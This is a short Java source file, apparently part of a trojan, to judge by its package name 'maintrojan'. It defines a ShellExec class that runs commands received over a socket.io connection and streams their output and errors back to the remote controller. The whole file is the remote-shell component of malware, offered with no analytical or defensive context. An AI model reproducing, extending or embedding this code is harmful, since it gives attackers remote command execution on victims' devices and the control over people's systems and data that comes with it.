package com.example.maintrojan;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import io.socket.client.Socket;

public class ShellExec {
    private static Process process;

    public static void execute(String command, Socket sock) {
        new Thread(() -> {
            try {
                if (process != null) {
                    process.destroy();
                }
                process = Runtime.getRuntime().exec(command);
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    sock.emit("shellOut", line + "\n");
                }
                while ((line = errorReader.readLine()) != null) {
                    sock.emit("shellOut", line + "\n");
                }
                process.waitFor();
            } catch (Exception e) {
                sock.emit("shellOut", "Error: " + e.getMessage() + "\n");
            }
        }).start();
    }

    public static void destroy() {
        if (process != null) {
            process.destroy();
            process = null;
        }
    }
}
